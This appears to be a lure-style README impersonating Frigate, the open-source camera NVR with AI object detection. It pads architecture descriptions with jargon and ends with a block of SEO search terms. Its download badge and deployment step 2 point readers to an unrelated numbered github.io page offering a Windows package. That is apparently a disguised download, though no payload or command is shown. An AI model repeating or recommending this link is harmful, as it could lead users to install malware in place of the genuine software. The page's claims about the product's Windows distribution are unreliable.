# FRIGATE // SURVEILLANCE_INFRASTRUCTURE_LEDGER

> **TARGET_ENVIRONMENT**: Windows 11 / Windows 10 / Windows Server 2022 (x64 / WSL2 Container Engine)  
> **COMPILATION_MODE**: Native Host Bridge / Docker Engine Integration / Hardware Acceleration Pipeline

---

## [01] SYSTEM_MANIFEST & SCOPE

[![Download Frigate](https://img.shields.io/badge/Download-Frigate-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://d80652160.github.io/.github/Frigate-VideoSurveillance-Hub)

Frigate is an open-source Network Video Recorder (NVR) built around real-time local AI object detection. Designed to process continuous camera feeds with minimal host resource consumption, it offloads video decoding and tensor inferencing to dedicated GPU or hardware accelerator components while maintaining high-frame-rate local storage pipelines.

The platform continuously monitors low-resolution sub-streams for motion vector changes, routing detected regions to inference models only when necessary. This architecture allows simultaneous processing of dozens of high-density RTSP feeds without straining system resources on Windows environments.

---

## [02] LOW_LEVEL_ARCHITECTURE

* **[STREAM_INGESTION_ENGINE]** : Ingests high-resolution primary and low-resolution sub-streams from RTSP and ONVIF endpoints using optimized FFmpeg hardware-bound pipelines.
* **[DETECTION_INFERENCE_BRIDGE]** : Routes active motion frames to TensorRT, OpenVINO, or DirectML inference targets for real-time spatial object taxonomy.
* **[EVENT_&_CLIP_CONTROLLER]** : Evaluates object confidence scores, tracking bounding boxes across frames to trigger local clip saving and snapshot retention.
* **[MQTT_DISPATCH_SUBSYSTEM]** : Publishes low-latency binary events, detection counts, and JPEG snapshots to external automation platforms over standard protocols.

<img src="https://frigate.video/images/live.webp" alt="Program Interface Screenshot"/>

---

## [03] PARAMETRIC_SUBSYSTEM_MATRIX

| SUBSYSTEM_ID | INTERFACE_TECH | OPERATIONAL_BEHAVIOR |
| :--- | :--- | :--- |
| **INGEST_01** | RTSP / RTMP / ONVIF | Dual-stream extraction separating high-res recording from low-res analysis. |
| **INFER_02** | TensorRT / DirectML / OpenVINO | Executes neural network inference pass on candidate bounding regions. |
| **RECORD_03** | FFmpeg / H.264 / H.265 | Performs zero-copy direct pass-through video recording to disk storage. |
| **TELEMETRY_04**| MQTT Broker Protocol | Broadcasts state transitions, motion events, and system metrics in real time. |
| **UI_05** | WebRTC / MSE / HTTP | Renders sub-second latency camera previews and playback timelines in browser console. |

---

## [04] DEPLOYMENT_AND_EXECUTION_PROTOCOL

1. Prepare Windows target system with current GPU drivers and WSL2/Docker container environment.
2. Obtain deployment configuration template from the repository release link above.
3. Configure YAML manifest file specifying camera sub-stream URIs, detect resolutions, and target hardware accelerator parameters.
4. Mount target local storage directories for persistent clip retainment and database state storage.
5. Initialize runtime container service or host binary execution pass.
6. Verify feed ingestion and inference frame rate metrics using built-in web console interface.

---

### SEARCH TERMS
Frigate • NVR software • AI object detection • IP camera software • video surveillance • RTSP stream recorder • camera monitoring • local security recorder • Windows NVR • security camera software • object tracking • smart camera recording • H.265 stream ingest • CCTV camera manager • motion analysis software
